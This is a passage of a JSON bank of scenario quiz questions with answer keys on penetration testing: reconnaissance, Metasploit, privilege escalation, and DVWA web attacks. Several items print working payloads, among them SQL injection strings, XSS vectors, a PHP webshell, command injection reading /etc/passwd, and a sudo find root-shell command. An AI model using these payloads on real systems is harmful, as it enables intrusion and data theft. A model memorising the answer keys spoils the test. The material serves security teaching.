public GitHub repository belonging to a lead developer containing database connection strings with hardcoded passwords. How should this finding be treated?", "options": ["Disregard the finding entirely because passive OSINT is excluded from VAPT reports", "Delete the GitHub repository using automated API scripts to protect the client", "Log into production databases immediately to extract full customer tables as proof", "Document the finding with redacted evidence and alert the client if credentials are live"], "answer": 3, "explanation": "Exposed credentials on public repositories represent an immediate Information Disclosure and Credential Exposure risk. Testers must document the finding, redact sensitive details, and provide timely notification for rapid remediation."}, {"id": 103, "difficulty": "Scenario", "unit": "Unit II", "topic": "Active Reconnaissance - IDS Evasion", "question": "During an authorized external penetration test, the client's Security Operations Center (SOC) detects the tester's Nmap scan and blocks the source IP address. The tester needs to continue scanning without triggering automated rate-based threshold alerts. Which timing template and scan type should be employed?", "options": ["Switch to timing template T1 or T2 using a TCP SYN scan with packet fragmentation", "Use Nmap with '-A' and '--max-rate 50000' to overpower the firewall inspection engine", "Execute an unprivileged TCP Connect scan simultaneously across twenty parallel sessions", "Switch to timing template T5 and launch a high-volume UDP broadcast across all ports"], "answer": 0, "explanation": "T1 (Sneaky) and T2 (Polite) timing templates insert delays between probes (15 seconds and 0.4 seconds, respectively), slowing packet volume to stay below automated IDS/IPS threshold-detection alerts."}, {"id": 104, "difficulty": "Scenario", "unit": "Unit II", "topic": "DNS Zone Transfer Assessment", "question": "A tester executes 'dig AXFR corp.internal @ns1.corp.internal' and receives a full dump of 450 DNS records, including internal IP mappings for dev-db.corp.internal, vpn.corp.internal, and domain-controller.corp.internal. What severity should be assigned to this finding in the VAPT report?", "options": ["Critical (10.0) because an unrestricted zone transfer grants remote root shell access", "Informational (0.0) because DNS records are globally public and pose zero threat", "Low (1.0) because internal IP addresses cannot be resolved across external routes", "Medium / High (Information Disclosure) due to exposing internal infrastructure topology"], "answer": 3, "explanation": "Unrestricted DNS Zone Transfers allow unauthorized parties to map an organization's entire internal namespace, server roles, and IP topology. This is a significant Information Disclosure / Security Misconfiguration issue (typically rated Medium to High)."}, {"id": 105, "difficulty": "Scenario", "unit": "Unit II", "topic": "OSINT - theHarvester & LinkedIn", "question": "During intelligence gathering, a tester runs 'theHarvester -d target.com -b google,linkedin' and extracts 60 corporate email addresses along with employee job titles. How can this information be operationalized in a social engineering assessment?", "options": ["To execute an automated buffer overflow against the target organization's core router", "To construct targeted spear-phishing pretexts aimed at specific organizational roles", "To overwrite the authoritative DNS zone files on the hosting domain registrar servers", "To decrypt the SSL/TLS private keys of the corporate web server using rainbow tables"], "answer": 1, "explanation": "Email addresses paired with organizational roles (from LinkedIn) enable attackers or Red Teams to craft convincing, highly targeted spear-phishing pretexts tailored to specific job responsibilities."}, {"id": 106, "difficulty": "Scenario", "unit": "Unit II", "topic": "Active Reconnaissance - Firewall Analysis", "question": "An ethical hacker scans port 443 with Nmap. The scan reports the port state as 'filtered'. What does this response indicate about the target network configuration?", "options": ["The port is conclusively closed and the target replied with an ICMP Port Unreachable", "The web server is actively listening on port 443 and responded with a SYN-ACK packet", "The web server's SSL certificate has expired and needs immediate administrative renewal", "A firewall or packet filter dropped the probe, preventing Nmap from determining state"], "answer": 3, "explanation": "A state of 'filtered' means that Nmap cannot determine whether the port is open because packet filtering (firewall ACLs or network drops) prevented its probes from reaching the port or returning a response."}, {"id": 107, "difficulty": "Scenario", "unit": "Unit III", "topic": "Metasploit - vsftpd 2.3.4 Backdoor", "question": "A tester discovers vsftpd 2.3.4 running on Metasploitable 2 and configures 'exploit/unix/ftp/vsftpd_234_backdoor'. After launching 'run', a command prompt opens directly as root. What underlying mechanism did this exploit trigger?", "options": ["A stack-based buffer overflow in the FTP parser that overwrote the EIP pointer", "An unauthenticated SQL injection vulnerability in the FTP authentication database", "A race condition in the Linux kernel memory subsystem that corrupted /etc/shadow", "A malicious backdoor that spawned a root shell on port 6200 when a user submitted ':)'"], "answer": 3, "explanation": "In 2011, the vsftpd 2.3.4 source archive was maliciously backdoored. When any username ending in a smiley face ':) ' was submitted, the daemon spawned a root shell listening on TCP port 6200."}, {"id": 108, "difficulty": "Scenario", "unit": "Unit III", "topic": "Metasploit Listeners Behind NAT", "question": "A penetration tester is on an internal NATed private network (192.168.1.50) while their public router IP is 203.0.113.10. When generating an external reverse shell with MSFvenom, how should the payload and multi/handler listener be configured?", "options": ["Set payload LPORT to 0 and configure multi/handler to sniff all external DNS traffic", "Set payload LHOST to the victim's public IP address and disable all router firewall logs", "Set payload LHOST to the public IP with port forwarding; bind handler LHOST locally", "Set both payload LHOST and handler LHOST to 127.0.0.1 to route traffic via loopback"], "answer": 2, "explanation": "The payload on the external victim must connect to the attacker's reachable public IP (203.0.113.10), which forwards the port to the attacker's local IP (192.168.1.50) where the listener binds."}, {"id": 109, "difficulty": "Scenario", "unit": "Unit III", "topic": "Linux Privilege Escalation - sudo Misconfiguration", "question": "A tester achieves a low-privilege shell on an Ubuntu target and runs 'sudo -l', discovering: '(root) NOPASSWD: /usr/bin/find'. How can the tester escalate directly to root using GTFOBins techniques?", "options": ["Execute 'sudo find --decrypt-passwords /etc/shadow' to display all system credentials", "Execute 'find / -perm -4000 -name sudo' and reboot the target system immediately", "Execute 'sudo find . -delete /root' to overwrite the administrative profile permissions", "Execute 'sudo find . -exec /bin/sh \\; -quit' to spawn an interactive root shell"], "answer": 3, "explanation": "The standard GTFOBins technique for '/usr/bin/find' with sudo privileges is: 'sudo find . -exec /bin/sh \\; -quit'. The '-exec' flag executes '/bin/sh' under find's elevated root process context."}, {"id": 110, "difficulty": "Scenario", "unit": "Unit III", "topic": "Password Cracking - Hashcat Modes", "question": "A tester dumps a password hash starting with '$6$rounds=5000$saltsalt$...' from an extracted shadow file. Which Hashcat hash mode number (-m) must be specified to crack this hash using rockyou.txt?", "options": ["-m 300 (MySQL v4.1)", "-m 1800 (sha512crypt, SHA512(Unix))", "-m 0 (MD5 raw hash)", "-m 1000 (NTLM hash)"], "answer": 1, "explanation": "In Hashcat, mode 1800 corresponds specifically to 'sha512crypt $6$, SHA512 (Unix)'. Mode 0 is raw MD5, mode 1000 is NTLM, and mode 300 is MySQL."}, {"id": 111, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA SQL Injection - Column Enumeration", "question": "On DVWA SQLi (Low), a tester injects \"1' ORDER BY 1#\", \"1' ORDER BY 2#\", and receives normal outputs. When injecting \"1' ORDER BY 3#\", the page throws an 'Unknown column 3' error. What does this confirm?", "options": ["The database engine is running on an unpatched 32-bit Windows Server 2003 system", "The query returns two columns; the UNION SELECT injection must have exactly two columns", "The web application has blocked the tester's IP address using an automated firewall", "The database has crashed and all existing user tables have been purged from disk"], "answer": 1, "explanation": "If 'ORDER BY 2' succeeds and 'ORDER BY 3' fails, the query returns exactly two columns. A subsequent UNION SELECT query must specify exactly two columns (e.g., 'UNION SELECT 1, 2#') to avoid syntax errors."}, {"id": 112, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA SQL Injection - Data Extraction", "question": "Continuing the DVWA SQLi test where the original query returns two columns, which injected payload will extract the current database user and database version?", "options": ["1' DROP TABLE users; SELECT user()#", "1' UNION SELECT * FROM admin WHERE 1=1#", "1' ORDER BY version(), user()#", "1' UNION SELECT user(), version()#"], "answer": 3, "explanation": "Since the query expects two columns, '1' UNION SELECT user(), version()#' matches the column count and renders the database user (e.g., root@localhost) and MySQL version (e.g., 5.0.51a) directly in the UI."}, {"id": 113, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA XSS - Reflected", "question": "A tester inputs '<script>alert(1)<\/script>' into a web application search bar. The page refreshes and immediately displays a pop-up alert box saying '1'. What vulnerability has been proven?", "options": ["Remote Buffer Overflow in web daemon stack", "Reflected Cross-Site Scripting (Reflected XSS)", "Server-Side Template Injection (SSTI code exec)", "Local File Inclusion (LFI directory traversal)"], "answer": 1, "explanation": "When unsanitized user input in an HTTP request is immediately echoed back into the rendered HTML response and executed by the browser as JavaScript, it confirms a Reflected XSS vulnerability."}, {"id": 114, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA XSS - Stored", "question": "On the DVWA Guestbook page, a tester posts '<script>alert(document.cookie)<\/script>' into the message field. Every time an administrator or student visits the page, a pop-up displays their session cookie. What makes this vulnerability Critical in an enterprise context?", "options": ["The script persists in the database and executes for all users, enabling session theft", "The script prevents search engine bots from indexing the company's public website", "The script automatically formats the backend storage hard drives into ext4 filesystems", "The script permanently disables the web server's underlying physical hardware cooling"], "answer": 0, "explanation": "Stored XSS is severe because the malicious script is saved permanently in the backend database. Every user who loads the affected page executes the attacker's script, enabling widespread credential and session theft."}, {"id": 115, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA File Upload - Client-Side Bypass", "question": "A web application's upload form blocks 'shell.php' with a JavaScript alert: 'Only JPG and PNG allowed!'. No network request was sent to the server. How does a tester bypass this check?", "options": ["Increase the screen resolution in browser developer tools to bypass DOM event handlers", "Compress the PHP file into a multi-part RAR archive and upload it via unauthenticated FTP", "Rename to shell.jpg, select it, and use Burp Proxy to rename it back to shell.php", "Reboot the client workstation and disable the physical Ethernet network interface card"], "answer": 2, "explanation": "Client-side JavaScript validations can be bypassed easily: name the file with an allowed extension (.jpg) to pass the browser check, then intercept the HTTP POST request in Burp Suite and change the filename back to 'shell.php'."}, {"id": 116, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA File Upload - Web Shell Execution", "question": "A tester successfully uploads a minimal PHP webshell containing '<?php system($_GET[\"cmd\"]); ?>' to '/hackable/uploads/webshell.php'. How can the tester verify code execution on the server?", "options": ["Browse to 'http://target/hackable/uploads/webshell.php?cmd=id' to verify command output", "Send an ICMP Ping packet with a payload size of 65,500 bytes to the gateway router", "Execute 'msfconsole -x use exploit/windows/smb/ms08_067_netapi' against port 80", "Open browser developer console and type 'localStorage.clear()' to refresh memory"], "answer": 0, "explanation": "The webshell accepts command input via the 'cmd' GET parameter and executes it through the PHP system() function. Visiting '?cmd=id' displays the web server user's identity (e.g., 'uid=33(www-data) gid=33(www-data)')."}, {"id": 117, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Broken Access Control - IDOR", "question": "A student logs into a university portal and views their grades at URL 'https://portal.univ.edu/view?student_id=1054'. The student changes the URL parameter to 'student_id=1055' and immediately sees another student's transcript and personal data. What vulnerability class is this?", "options": ["DOM-Based Cross-Site Scripting in profile headers", "Server-Side Request Forgery against cloud metadata", "Second-Order SQL Injection in database procedures", "Broken Access Control / Insecure Direct Object Reference (IDOR)"], "answer": 3, "explanation": "Insecure Direct Object Reference (IDOR), a subset of Broken Access Control (OWASP A01), occurs when an application exposes a reference to an internal object without verifying that the requesting user has authorization to access it."}, {"id": 118, "difficulty": "Scenario", "unit": "Unit III", "topic": "Password Attacks - Hydra Rate Limiting", "question": "A tester executes 'hydra -l admin -P rockyou.txt target.com ssh' and observes that after 10 attempts, Hydra outputs 'Connection reset by peer' and aborts. What defensive control was encountered, and how should testing adapt?", "options": ["Hydra requires an administrative commercial license to crack SSH passwords", "The rockyou.txt wordlist has been permanently corrupted by the operating system", "Fail2ban rate-limiting blocked the IP; reduce concurrency (-t 1) and add delay", "The target SSH server has run out of physical disk space on the system drive"], "answer": 2, "explanation": "Modern servers employ tools like Fail2ban or SSH connection rate limiters. Rapid connection attempts trigger automatic IP bans. Testers must throttle attempts (-t 1 -W delay) or obtain an allowlist exemption per the RoE."}, {"id": 119, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Burp Suite Intruder - Credential Stuffing", "question": "A tester runs a Burp Intruder Sniper attack with 500 common passwords against an administrative login endpoint. In the results table, 499 requests return HTTP 200 with Length 3420, while one request returns HTTP 302 with Length 450. What does this discrepancy indicate?", "options": ["The request was dropped by the web application firewall due to illegal characters", "The web server crashed and threw an unhandled null pointer exception on that attempt", "HTTP 302 with Length 450 redirected to dashboard, indicating the valid password", "The password dictionary reached the end of file and Burp Intruder restarted from top"], "answer": 2, "explanation": "In login brute-forcing, failed logins typically return a consistent response (HTTP 200 with error message and uniform byte length). A successful login usually issues a session cookie and an HTTP 302 redirect, resulting in distinct status code and length."}, {"id": 120, "difficulty": "Scenario", "unit": "Unit I", "topic": "Engagement Ethics & Client Requests", "question": "During a scheduled penetration test, a client system administrator casually asks the tester in chat: 'Can you launch a heavy denial-of-service stress test on our primary database right now to see if it survives?'. The RoE explicitly prohibits DoS attacks. How should the tester respond?", "options": ["Decline the request; DoS violates the RoE and requires formal scope amendment", "Conduct the DoS attack through an anonymous proxy network so it cannot be traced", "Execute an intense SYN flood immediately since the request came verbally from staff", "Terminate the entire penetration testing engagement immediately and invoice for damages"], "answer": 0, "explanation": "Testers must never deviate from signed Rules of Engagement based on informal verbal requests. DoS attacks risk service outages and business disruption, requiring formal contractual amendments and executive authorization."}, {"id": 121, "difficulty": "Scenario", "unit": "Unit II", "topic": "Active Reconnaissance - Web Enumeration", "question": "A tester discovers that 'http://target.corp/phpmyadmin/' is publicly accessible and allows login using username 'root' with a blank password. What is the immediate remediation recommendation?", "options": ["Change the web browser's user-agent header to block search engine web crawlers", "Restrict access to internal management subnets, enforce strong passwords, disable remote root", "Migrate the database server to run on an unencrypted UDP port above 50,000", "Reinstall the operating system with a 32-bit architecture to limit memory addressing"], "answer": 1, "explanation": "Exposing phpMyAdmin with default or blank credentials is a critical Security Misconfiguration (OWASP A05). Access must be restricted to management networks/VPNs and protected by strong authentication."}, {"id": 122, "difficulty": "Scenario", "unit": "Unit V", "topic": "VAPT Reporting - Executive Summary", "question": "When presenting a VAPT report to the Board of Directors, a junior tester includes ten pages of raw hex dumps and Nmap command flags in the Executive Summary. How should this section be restructured?", "options": ["Replace the document entirely with an automated raw HTML export from Nessus Essentials", "Focus on business risk: overall posture, financial impact, and top 3 priorities", "Double technical dumps and add raw assembly disassembly for all discovered binaries", "Remove all mention of vulnerabilities to avoid alarming board members about exposure"], "answer": 1, "explanation": "Executive Summaries must be concise and non-technical, translating technical vulnerabilities into business risks (reputation, regulatory penalties, financial loss) and highlighting key strategic remediation priorities."}, {"id": 123, "difficulty": "Scenario", "unit": "Unit V", "topic": "Evidence Management & PII", "question": "A tester extracts 2,000 credit card records and customer Aadhaar numbers while demonstrating an SQL injection vulnerability. How should this evidence be included in the formal client report?", "options": ["Mask/redact sensitive data (show last 4 digits only) and delete test dumps securely", "Omit the SQL injection vulnerability entirely from the report to avoid handling data", "Upload the raw CSV database dump to a public pastebin service and include the link", "Publish all unredacted credit card numbers and security CVVs in the public report"], "answer": 0, "explanation": "Professional ethics and data protection laws (such as the DPDP Act 2023) mandate safeguarding customer PII. Proof-of-concept evidence must redact sensitive personal data, and test dumps must be securely purged."}, {"id": 124, "difficulty": "Scenario", "unit": "Unit V", "topic": "Zero-Day Disclosure Ethics", "question": "During a routine web assessment, a penetration tester identifies a previously unknown zero-day remote code execution vulnerability in a commercial enterprise CRM used by thousands of global companies. What is the ethical course of action?", "options": ["Use the zero-day to silently access other companies' CRMs to verify if vulnerable", "Report finding to the client for mitigation, and coordinate disclosure with vendor/CERT", "Sell the zero-day exploit code on an anonymous darknet forum for commercial profit", "Publicly post the exploit on social media immediately without giving vendor notice"], "answer": 1, "explanation": "Ethical practice requires coordinating responsible disclosure with the vendor (or national CERT) to allow a patch to be developed, while notifying the testing client so they can implement temporary compensating controls."}, {"id": 125, "difficulty": "Scenario", "unit": "Unit II", "topic": "Network Enumeration - SMB Signing", "question": "An Nmap scan using '--script=smb2-security-mode' against a corporate network reports 'Message signing enabled but not required' on all Windows workstations. What attack technique does this configuration permit?", "options": ["Physical hard drive failure caused by excessive read-write spindle rotation speed", "Over-the-air WPA2 enterprise wireless encryption key recovery without hardware probes", "SMB Relay attacks (NTLM credential relaying) to gain access to other network hosts", "Automated SQL injection into all local Microsoft Office Word documents on disk"], "answer": 2, "explanation": "When SMB signing is not required, an attacker on the local network can intercept NTLM authentication requests (e.g., via Responder) and relay them to another target host to execute commands or establish sessions."}, {"id": 126, "difficulty": "Scenario", "unit": "Unit II", "topic": "Passive Reconnaissance - Google Dorking", "question": "An ethical hacker uses the Google dork 'site:targetbank.com filetype:sql intext:password' and locates an exposed database backup file on a staging server. What underlying issue does this highlight?", "options": ["Insecure file storage and sensitive data exposure from poor directory configuration", "A cryptographic collision flaw in the bank's core SSL/TLS digital certificate", "A zero-day hardware vulnerability in Google's cloud web crawling search spiders", "A memory corruption bug in the developer's local SQL database development workstation"], "answer": 0, "explanation": "Placing database backup files (.sql, .bak) in public web-accessible directories where search engine bots can index them is a classic Security Misconfiguration leading to Severe Data Exposure."}, {"id": 127, "difficulty": "Scenario", "unit": "Unit III", "topic": "Linux Privilege Escalation - World-Writable Files", "question": "During post-exploitation enumeration on a Linux server, a tester discovers that the '/etc/passwd' file has file permissions '-rw-rw-rw-' (666). How can the tester immediately obtain root privileges?", "options": ["Append a new user entry with UID 0 (root equivalent) directly into /etc/passwd", "Run 'chmod 000 /etc/passwd' to force the Linux kernel into an emergency recovery shell", "Delete the entire /etc/passwd file and reboot to bypass authentication completely", "Execute 'grep root /etc/passwd' repeatedly until an unhandled buffer overflow occurs"], "answer": 0, "explanation": "If /etc/passwd is world-writable, any user can add a line: 'hacker:$1$xyz...:0:0:root:/root:/bin/bash'. Since the UID is set to 0, logging in as 'hacker' grants immediate superuser root privileges."}, {"id": 128, "difficulty": "Scenario", "unit": "Unit III", "topic": "Windows Privilege Escalation - Service Paths", "question": "A tester running PowerUp discovers a service binary path configured as 'C:\\Program Files\\Corporate Tools\\Backup Service\\backup.exe' without quotes, running as LocalSystem. If the tester has write access to 'C:\\Program Files\\Corporate Tools\\', how is this exploited?", "options": ["Rename the entire 'Program Files' folder to 'Windows' to trigger a system error", "Modify the network subnet gateway address to point to the tester's local loopback", "Delete the LocalSystem user profile from the Windows active directory domain controller", "Place a payload named 'Backup.exe' in 'C:\\Program Files\\Corporate Tools\\' and restart"], "answer": 3, "explanation": "Windows parses unquoted paths with spaces sequentially. Before checking 'Backup Service\\backup.exe', it looks for 'C:\\Program Files\\Corporate Tools\\Backup.exe'. Placing a payload there executes it as LocalSystem on service restart."}, {"id": 129, "difficulty": "Scenario", "unit": "Unit II", "topic": "Vulnerability Assessment - Validation", "question": "A Nessus scan reports CVE-2021-44228 (Log4Shell, CVSS 10.0) on an internal API gateway based on a detected jar file name. Before briefing the client's executive leadership, what must the penetration testing team do?", "options": ["Rewrite the entire API gateway source code in C++ to remove all Java dependencies", "Perform safe proof-of-concept validation (e.g. DNS callback) to confirm exploitability", "Deliver raw scanner output and instruct the client to shut down all corporate data centers", "Dismiss the finding entirely because automated vulnerability scanners are never accurate"], "answer": 1, "explanation": "Professional methodology mandates validating scanner findings with manual proof-of-concept verification (e.g., DNS lookup via Canarytokens or Burp Collaborator) to eliminate false positives before alerting executive stakeholders."}, {"id": 130, "difficulty": "Scenario", "unit": "Unit I", "topic": "Scope of Responsibilities", "question": "A client requests that the penetration tester apply patches and modify Apache configuration files directly on their production servers during the testing window. What is the tester's correct response?", "options": ["Charge an extra fee and delete all web server configuration files to ensure total security", "Reboot all client production servers immediately without notifying the engineering team", "Decline; testers find flaws and advise; system administrators perform patching", "Agree and apply experimental Linux kernel patches directly to the production database"], "answer": 2, "explanation": "Penetration testers assess security and provide recommendations. Direct patching of production systems violates role boundaries, creates massive liability, and risks system downtime if an update fails."}, {"id": 131, "difficulty": "Scenario", "unit": "Unit III", "topic": "Payload Delivery - Staged vs Stageless", "question": "A Red Team operator is delivering a payload through a highly monitored network egress perimeter where deep packet inspection (DPI) inspects all secondary payload downloads. Why might a stageless payload (e.g., windows/x64/meterpreter_reverse_https) be chosen over a staged payload?", "options": ["A stageless payload avoids secondary staging downloads, evading perimeter inspection", "A stageless payload is completely invisible to all client-side antivirus and EDR agents", "A stageless payload only operates on systems that do not have an active network card", "A stageless payload does not require any TCP/IP network connection to establish a shell"], "answer": 0, "explanation": "Staged payloads make an initial network connection to download the second stage in memory, which network monitoring tools often detect or block. Stageless payloads embed everything into one binary, avoiding the secondary download."}, {"id": 132, "difficulty": "Scenario", "unit": "Unit II", "topic": "DNS Zone Transfer - Result Interpretation", "question": "A tester runs 'dig AXFR clientdomain.com @ns1.clientdomain.com' and receives the response: ';; communications error to ...: end of file' and '; Transfer failed: REFUSED'. What does this result signify regarding the server's security posture?", "options": ["The tester's network interface card has been permanently corrupted by the DNS daemon", "The domain name has expired and is now available for public purchase on registrars", "The DNS server is properly secured; it rejected the unauthorized zone transfer", "The DNS server is critically vulnerable to remote code execution buffer overflows"], "answer": 2, "explanation": "'Transfer failed: REFUSED' indicates that the DNS server's access control lists correctly restrict AXFR requests to authorized secondary DNS servers, successfully preventing unauthorized zone transfers."}, {"id": 133, "difficulty": "Scenario", "unit": "Unit II", "topic": "Network Enumeration - enum4linux", "question": "An enum4linux scan against a target Windows Server yields the output: 'account_expires: Never | password_can_change: Yes | password_never_expires: True' for user 'svc_backup'. What security risk does this highlight?", "options": ["The user account has been disabled and poses zero risk to the organizational network", "Poor password hygiene, making the account an ideal target for brute-force attacks", "The server has automatically enabled hardware-level biometric authentication for logins", "The operating system has been permanently converted into an unmanaged Linux distribution"], "answer": 1, "explanation": "Service accounts with non-expiring passwords often have stale, weak credentials that are rarely rotated. If discovered by an attacker, they provide persistent, reusable access across domain systems."}, {"id": 134, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Security - WAF Bypass", "question": "A web application firewall (WAF) blocks any input containing the string '<script>'. Which alternative payload successfully demonstrates Cross-Site Scripting without using '<script>' tags?", "options": ["<img src=x onerror=alert(1)>", "system('alert(1)')", "<?php echo 'alert(1)'; ?>", "SELECT * FROM users WHERE '1'='1'"], "answer": 0, "explanation": "HTML event handlers on alternative tags (e.g., <img src=x onerror=alert(1)>, <svg onload=alert(1)>) execute JavaScript when the element triggers an error or loads, completely bypassing simplistic filters that only look for '<script>'."}, {"id": 135, "difficulty": "Scenario", "unit": "Unit IV", "topic": "DVWA Command Injection", "question": "On the DVWA Command Injection page, the input form executes 'ping -c 4 <input>'. A tester inputs '127.0.0.1; cat /etc/passwd'. What enables this command injection to succeed?", "options": ["The web server's SSL certificate failed to validate the client's browser user agent", "The Linux operating system automatically translates semicolons into SSH certificates", "The ping utility was compiled without hardware address resolution protocol support", "The app passes unvalidated input directly to a shell function without escaping"], "answer": 3, "explanation": "The backend code concatenates user input directly into a shell command (e.g., shell_exec('ping -c 4 ' . $ip)). The semicolon (;) acts as a command separator in Unix shells, allowing arbitrary subsequent commands to execute."}, {"id": 136, "difficulty": "Scenario", "unit": "Unit II", "topic": "Network Enumeration - SNMP Walking", "question": "A tester runs 'snmpwalk -v1 -c public 192.168.1.1' and successfully extracts routing tables, internal IP interfaces, and process lists from an enterprise core router. What remediation should be recommended?", "options": ["Reconfigure the core router to only route unencrypted UDP packets across the LAN", "Increase the SNMP polling rate to 10,000 queries per second to saturate the interface", "Replace all fiber optic network cables with Category 5 unshielded twisted pair wiring", "Migrate to SNMPv3 with authentication/encryption, and change default community strings"], "answer": 3, "explanation": "SNMPv1 and SNMPv2c transmit community strings in cleartext and lack robust access control. Organizations should upgrade to SNMPv3 (which provides cryptographic authentication and encryption) and change default strings."}, {"id": 137, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Security - Cookie Flags", "question": "An assessment reveals that an e-commerce website transmits session cookies over HTTPS, but the cookie lacks the 'Secure' flag attribute. What threat does this omission create?", "options": ["The client operating system will immediately flag the web domain as malware", "The web browser will refuse to load any images or stylesheets from the web server", "The database server will automatically delete all customer shopping cart records", "If an HTTP link is visited, the browser transmits the cookie in unencrypted cleartext"], "answer": 3, "explanation": "The 'Secure' flag instructs the browser to never send the cookie over unencrypted HTTP connections. Without it, if a user clicks an 'http://' link or encounters an unencrypted asset, the cookie is leaked in cleartext."}, {"id": 138, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Security - Clickjacking", "question": "A penetration tester notices that a banking portal's response headers lack 'X-Frame-Options' and 'Content-Security-Policy: frame-ancestors'. What attack can be demonstrated using this weakness?", "options": ["Bypassing hardware biometric fingerprint readers on mobile banking applications", "Remote heap memory corruption through malformed HTTP chunked transfer encodings", "Clickjacking (UI Redressing) by rendering the portal inside an invisible iframe", "Immediate decryption of the bank's core database storage arrays across the network"], "answer": 2, "explanation": "Without framing protections (X-Frame-Options: DENY/SAMEORIGIN or CSP frame-ancestors 'self'), an attacker can embed the vulnerable site in an invisible iframe on a malicious page, tricking users into clicking buttons (Clickjacking)."}, {"id": 139, "difficulty": "Scenario", "unit": "Unit III", "topic": "Password Attacks - Salting Demonstration", "question": "A tester extracts two user password hashes from a database: UserA has '5f4dcc3b5aa765d61d8327deb882cf99' and UserB has '5f4dcc3b5aa765d61d8327deb882cf99'. What does this reveal about the application's hashing implementation?", "options": ["Unsalted hashing (plain MD5); identical plaintext passwords produce identical hashes", "Both users are logged into the exact same physical workstation at the exact same time", "The database has suffered a severe memory corruption error that duplicated user rows", "The app uses quantum cryptography with unique 512-bit dynamic cryptographic salts"], "answer": 0, "explanation": "If two users have identical hashes, no salt was used. With proper salting, even if both users pick 'password', their random salt values make the resulting hashes completely unique, defeating precomputed lookup tables."}, {"id": 140, "difficulty": "Scenario", "unit": "Unit III", "topic": "Post-Exploitation - Meterpreter Migration", "question": "An attacker gains a Meterpreter shell on Windows by exploiting an unpatched web browser vulnerability. Within 30 seconds, the user closes the browser and the shell terminates. How could the attacker have prevented losing access?", "options": ["Immediately execute 'reboot' to lock the user out of their physical computer workstation", "Run 'migrate -N explorer.exe' upon initial access to move into a stable process", "Immediately run 'hashdump' without elevating privileges to lock the Windows SAM database", "Immediately disable the client's network interface card using the 'netsh' command"], "answer": 1, "explanation": "Meterpreter runs inside the memory space of the exploited process. If that process (e.g., browser) terminates, the session dies. Migrating into a persistent process (like explorer.exe) ensures the shell remains active."}, {"id": 141, "difficulty": "Scenario", "unit": "Unit I", "topic": "Engagement Safety & Outages", "question": "During an authorized daytime penetration test against an enterprise ERP system, the client reports that production database queries have ground to a halt due to table locks. What is the testing team's immediate procedural duty?", "options": ["Deny any involvement and continue testing through an alternative external proxy IP", "Pause active testing immediately, alert client technical contacts, and investigate", "Delete all local test logs on the attacking system to conceal scanning activity", "Accelerate the attack to finish the engagement quickly before the client cancels"], "answer": 1, "explanation": "Standard Rules of Engagement dictate that if testing adversely impacts production stability, all testing must cease immediately. The team must notify the client liaison and assist in determining if their activity caused the issue."}, {"id": 142, "difficulty": "Scenario", "unit": "Unit I", "topic": "Legal Compliance - IT Act 2000", "question": "A disgruntled former employee accesses their previous employer's cloud repository using retained credentials and downloads confidential source code before selling it to a competitor. Which sections of the IT Act 2000 are directly violated?", "options": ["No section is violated because the employee originally authored the source code", "Section 66F only, because downloading source code is legally categorized as warfare", "Section 43 (unauthorized download), Section 65 (source tampering), Section 66 (offences)", "Section 70B only, because the incident must be handled exclusively by insurance firms"], "answer": 2, "explanation": "Unauthorized access and downloading data violates Section 43/66. Stealing and misusing proprietary computer source code also breaches Section 65 (tampering with computer source documents) and Section 66C (identity/credential theft)."}, {"id": 143, "difficulty": "Scenario", "unit": "Unit I", "topic": "Social Engineering Pretexting", "question": "During an authorized Red Team social engineering assessment, a tester calls the company IT helpdesk posing as a remote sales VP stranded at an airport needing an emergency password reset. What social engineering principle is primarily being leveraged?", "options": ["Technical cryptographic exploitation of the PBX telephone network routing switches", "Physical lockpicking of the data center server cabinet door mechanisms", "Exploiting a buffer overflow vulnerability inside the helpdesk agent's VoIP headset", "Authority combined with Urgency to bypass standard identity verification protocols"], "answer": 3, "explanation": "Social engineering pretexts frequently exploit human psychological triggers: Authority (pretending to be an executive) and Urgency (an impending flight or meeting), pressuring helpdesk staff into skipping verification checks."}, {"id": 144, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Broken Access Control - Remediation", "question": "A penetration test reveals widespread IDOR vulnerabilities across an API where changing 'account_id' in GET requests exposes other customers' records. What is the fundamental, correct architectural fix?", "options": ["Change the HTTP request method from GET to POST without changing backend authorization", "Obfuscate the URL by converting the account ID integer into a Base64 encoded string", "Disable the browser developer tools on all client workstations using event handlers", "Implement server-side checks verifying the authenticated session owns the requested object"], "answer": 3, "explanation": "IDOR cannot be solved by obfuscation (like Base64 or GUIDs). The server must validate that the currently authenticated user session has explicit permission to view or manipulate the requested resource before returning data."}, {"id": 145, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Security - JWT Attacks", "question": "An API uses JSON Web Tokens (JWT) for authentication. A tester intercepts a token, modifies the payload to '\"role\": \"admin\"', changes the header algorithm to '\"alg\": \"none\"', removes the signature, and gains admin access. What is the underlying flaw?", "options": ["The client workstation has an inaccurate system clock that invalidated the token", "The web server's TLS certificate was signed using a self-signed certificate authority", "The server trusts client-set 'alg' headers and accepts unsigned tokens without checks", "The JSON parsing library is vulnerable to a stack-based buffer overflow in the runtime"], "answer": 2, "explanation": "The 'alg: none' vulnerability occurs when a server's JWT verification library accepts tokens with the algorithm header set to 'none', treating the unsigned token as valid and trusting whatever claims the attacker injected."}, {"id": 146, "difficulty": "Scenario", "unit": "Unit IV", "topic": "Web Application Security - XSS in Links", "question": "A web application generates a user profile link using parameter input: '<a href=\"USER_INPUT\">Website<\/a>'. A tester inputs 'javascript:alert(1)'. When a visitor clicks the link, the alert executes. What type of vulnerability is this?", "options": ["SQL Injection leading to database schema modification", "Cross-Site Scripting (XSS) via unsafe URI scheme in an href attribute", "Server-Side Request Forgery against internal metadata", "Path Traversal leading to unauthorized file downloads"], "answer": 1, "explanation": "If user-supplied URLs are placed directly into 'href' or 'src' attributes without validating that the protocol is safe (e.g., http/https), attackers can supply the 'javascript:' pseudo-protocol to execute arbitrary script on click."}, {"id": 147, "difficulty": "Scenario", "unit": "Unit III", "topic": "Blue Team Network Detection", "question": "A Blue Team 